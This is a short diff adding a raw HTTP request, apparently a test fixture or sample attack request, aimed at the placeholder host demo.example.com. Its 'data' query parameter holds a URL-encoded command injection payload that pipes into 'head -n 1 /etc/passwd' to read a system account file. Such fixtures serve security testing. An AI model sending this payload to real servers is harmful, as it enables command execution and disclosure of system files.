@@ -1,0 +1,4 @@
+GET /a?data='|%20head%20-n%201%20/etc/passwd' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
